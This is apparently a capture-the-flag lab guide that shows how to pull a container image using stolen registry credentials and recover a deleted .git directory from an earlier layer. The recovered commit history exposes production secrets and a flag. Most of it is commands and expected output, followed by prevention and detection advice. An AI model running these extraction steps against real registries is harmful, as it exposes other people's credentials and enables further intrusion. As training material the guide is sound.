# Attack #2: Container Image Layer Leak - Exploitation Guide

## Scenario

The attacker has obtained registry credentials from Attack #1 and can now access the container registry at `https://registry.sc.local:30443`. The organization has pushed a `recipe-api:v1.0` image to this registry.

This guide demonstrates how to extract sensitive data from "deleted" files in container image layers.

## Vulnerability

**The Dockerfile contains a common security mistake:**

```dockerfile
# STEP 5: Copy everything including .git
COPY . .

# STEP 6: Attempt to delete .git
RUN rm -rf .git
```

**Why this is vulnerable:**
- Each `RUN`, `COPY`, and `ADD` instruction creates a new image layer
- Deleting files in a later layer doesn't remove them from previous layers
- The `.git` directory with full commit history is preserved in the `COPY . .` layer
- Anyone with access to the image can extract previous layers

## Attack Steps

### Step 1: Discover the Image

Using the stolen registry credentials from Attack #1:

```bash
# Login to the registry
podman login registry.sc.local:30443 --tls-verify=false \
  -u sc-admin \
  -p RegistryPass123!

# List available images
curl -k -u sc-admin:RegistryPass123! \
  https://registry.sc.local:30443/v2/_catalog

# Expected output:
# {"repositories":["recipe-api"]}

# Check available tags
curl -k -u sc-admin:RegistryPass123! \
  https://registry.sc.local:30443/v2/recipe-api/tags/list

# Expected output:
# {"name":"recipe-api","tags":["v1.0"]}
```

### Step 2: Pull the Image

```bash
podman pull registry.sc.local:30443/recipe-api:v1.0 --tls-verify=false
```

### Step 3: Inspect Image Layers

```bash
# View image history to see all layers
podman history registry.sc.local:30443/recipe-api:v1.0

# Look for suspicious commands like "rm -rf .git"
```

**What you'll see:**
```
IMAGE          CREATED         CREATED BY                                      SIZE
4d85e382314b   5 minutes ago   CMD ["./recipe-api"]                            0B
3487c49d5ec1   5 minutes ago   EXPOSE 8080                                     0B
21b0982ba186   5 minutes ago   COPY --from=builder /app/recipe-api . # bui...  8.13MB
b6b5d675b3a5   5 minutes ago   RUN /bin/sh -c apk --no-cache add ca-certif...  8.47MB
3cc01cf84721   5 minutes ago   RUN /bin/sh -c CGO_ENABLED=0 GOOS=linux go ...  8.13MB
b6ad93049e15   5 minutes ago   RUN /bin/sh -c rm -rf .git # buildkit          0B      <-- DELETION!
98bb3b95fd70   5 minutes ago   COPY . . # buildkit                            17kB    <-- .git IS HERE!
```

**KEY OBSERVATION:** 
- Layer `98bb3b95fd70`: `COPY . .` - Contains the .git directory
- Layer `b6ad93049e15`: `RUN rm -rf .git` - Only marks .git as deleted in THIS layer

### Step 4: Extract the Vulnerable Layer

**Method 1: Using dive (recommended for analysis)**

```bash
# Install dive (Docker/Podman image layer explorer)
# On Fedora:
sudo dnf install dive

# Explore the image interactively
dive registry.sc.local:30443/recipe-api:v1.0

# Navigate to the layer before "rm -rf .git"
# Press Tab to switch between layers and file tree
# You'll see .git directory with all files
```

**Method 2: Manual extraction with podman**

```bash
# Save the image as a tar archive
podman save registry.sc.local:30443/recipe-api:v1.0 -o recipe-api.tar

# Extract the tar
mkdir recipe-api-extracted
tar -xf recipe-api.tar -C /tmp/recipe-api-extracted/

# The structure will be:
# recipe-api-extracted/
# ├── manifest.json          # Image metadata
# ├── <layer-hash>/          # Multiple layer directories
# │   ├── layer.tar          # Layer content
# │   └── json               # Layer config

# Find the layer containing .git
cd /tmp/recipe-api-extracted/

# List all layer directories
ls -la

# Check each layer for .git and find the one containing .git/HEAD
for layer in */; do
  if tar -tf "$layer/layer.tar" 2>/dev/null | grep -q "\.git/HEAD"; then
    echo "✓ Found .git in: $layer"
    LAYER_DIR="$layer"
    # Show some .git files for verification
    echo "  Sample .git files:"
    tar -tf "$layer/layer.tar" | grep -E "\.git/" | head -5
    break
  fi
done
```

**Method 3: Using container-diff**

```bash
# Install container-diff
go install github.com/GoogleContainerTools/container-diff/cmd/container-diff@latest

# Analyze file system differences between layers
container-diff analyze registry.sc.local:30443/recipe-api:v1.0 \
  --type=file \
  --json > analysis.json

# View the analysis
cat analysis.json | jq
```

### Step 5: Extract and Explore .git Directory

Now that LAYER_DIR is set to the layer containing `.git`, extract and explore it:

```bash
cd /tmp
# Save the image as a tar archive
podman save registry.sc.local:30443/recipe-api:v1.0 -o recipe-api.tar

# Extract the tar
mkdir recipe-api-extracted
tar -xf recipe-api.tar -C /tmp/recipe-api-extracted/

# Verify LAYER_DIR is set (should be set from previous step)
echo "Using layer: $LAYER_DIR"

# Extract the layer contents
mkdir -p layer-contents
tar -xf "$LAYER_DIR/layer.tar" -C layer-contents/

# Navigate to .git
cd layer-contents/
ls -la app/.git/

# Expected output:
# .git/
# ├── config
# ├── HEAD
# ├── objects/
# ├── refs/
# └── logs/
```

### Step 6: Extract the Flag from Git History

```bash
# View commit history
cd app
git log

# Expected output:
# commit 3dd110a... Security fix: Remove accidentally committed production secrets
# commit cb0d66f... Initial commit: Recipe API v1.0 with production config

# Check what was deleted in the second commit
git show 3dd110a

# Expected output shows deletion of .env.production

# Restore the deleted file from the first commit
git show cb0d66f:.env.production

# Or checkout the first commit
git checkout cb0d66f
cat .env.production
```

### Step 7: deep dive

The `.env.production` file contains:

```bash
# Production Environment Configuration
# WARNING: This file contains sensitive credentials

DATABASE_URL=postgresql://recipe_user:R3c1p3DB_S3cr3t@db.recipeco.internal:5432/recipes_prod
REDIS_URL=redis://cache.recipeco.internal:6379/0
SESSION_SECRET=sup3r_s3cr3t_s3ss10n_k3y_2024

# API Keys
STRIPE_API_KEY=sk_live_51N9X8YZ123456789ABCDEFGH
SENDGRID_API_KEY=SG.xYz789AbCdEf123456.gHiJkLmNoPqRsTuVwXyZ123456789

# Registry Credentials (from Attack #1)
REGISTRY_URL=https://registry.registry.svc.cluster.local:5000
REGISTRY_USERNAME=sc-admin
REGISTRY_PASSWORD=RegistryPass123!

# Next Challenge Flag
# FLAG{l4y3r_l34k_g1t_h1st0ry:NEXT:g1t0ps_c0mpr0m1s3}
# The attacker can use these registry credentials to manipulate container images
# Next attack: Investigate Gitea webhook configurations for pipeline manipulation
```

**FLAG:** `FLAG{l4y3r_l34k_g1t_h1st0ry:NEXT:g1t0ps_c0mpr0m1s3}`

## Real-World Impact

This vulnerability demonstrates several critical security issues:

### 1. **Secrets in Git History**
- Developers often accidentally commit secrets and then remove them
- Git history preserves ALL previous commits
- `.git` directory should NEVER be in container images

### 2. **Container Layer Persistence**
- Deleted files remain in previous layers
- Image size doesn't decrease when files are deleted
- Anyone with image access can extract previous layers

### 3. **Supply Chain Exposure**
- Production credentials leaked through development artifacts
- Database passwords, API keys, and session secrets exposed
- Registry credentials enable further attacks (Attack #3)

## Prevention Measures

### ✅ Proper Dockerfile Patterns

**WRONG:**
```dockerfile
COPY . .
RUN rm -rf .git secrets.txt
```

**CORRECT - Method 1: Multi-stage build**
```dockerfile
# Build stage
FROM golang:1.25-alpine AS builder
COPY go.mod go.sum ./
COPY cmd/ ./cmd/
COPY internal/ ./internal/
# Don't copy .git at all!
RUN go build -o app ./cmd/app

# Runtime stage
FROM alpine:latest
COPY --from=builder /app .
```

**CORRECT - Method 2: .dockerignore**
```
# .dockerignore
.git
.env*
*.key
secrets/
```

### ✅ Additional Security Measures

1. **Never commit secrets to Git**
   ```bash
   # Use git-secrets to prevent accidental commits
   git secrets --install
   git secrets --register-aws
   ```

2. **Scan images for secrets**
   ```bash
   # Use Trivy
   trivy image registry.sc.local:30443/recipe-api:v1.0
   
   # Use Grype
   grype registry.sc.local:30443/recipe-api:v1.0
   ```

3. **Minimize image layers**
   ```dockerfile
   # Combine commands to reduce layers
   RUN apt-get update && \
       apt-get install -y package && \
       apt-get clean && \
       rm -rf /var/lib/apt/lists/*
   ```

4. **Use distroless or scratch images**
   ```dockerfile
   FROM gcr.io/distroless/static-debian11
   COPY app /
   CMD ["/app"]
   ```

5. **Implement image signing**
   ```bash
   # Sign images with Cosign
   cosign sign registry.sc.local:30443/recipe-api:v1.0
   ```

## Detection Methods

Organizations can detect this vulnerability through:

1. **Automated scanning in CI/CD**
   - Trivy, Grype, Clair for vulnerability scanning
   - Secret detection tools (TruffleHog, detect-secrets)

2. **Policy enforcement**
   - OPA (Open Policy Agent) to reject images with .git
   - Kyverno policies to validate image structure

3. **Registry webhook monitoring**
   - Alert when images exceed expected size
   - Monitor for suspicious layer counts

4. **Regular security audits**
   - Periodic review of production images
   - Automated SBOM (Software Bill of Materials) generation

## Tools Used in This Attack

- **podman/docker**: Container runtime
- **curl**: Registry API interaction
- **dive**: Interactive layer exploration - https://github.com/wagoodman/dive
- **container-diff**: Layer comparison - https://github.com/GoogleContainerTools/container-diff
- **git**: Version control exploration
- **jq**: JSON parsing

## Next Steps

The flag reveals: `g1t0ps_c0mpr0m1s3`

**Attack #3** involves:
- Using registry access to inject malicious webhook configurations
- Manipulating Gitea webhooks to trigger compromised pipelines
- Intercepting or modifying pipeline execution

## Educational Value

This attack demonstrates:
1. ✅ Container image layer mechanics
2. ✅ Git history as an attack vector
3. ✅ Secrets management failures
4. ✅ Supply chain security principles
5. ✅ Forensics and incident response techniques

Participants learn both offensive (how to exploit) and defensive (how to prevent and detect) security practices.
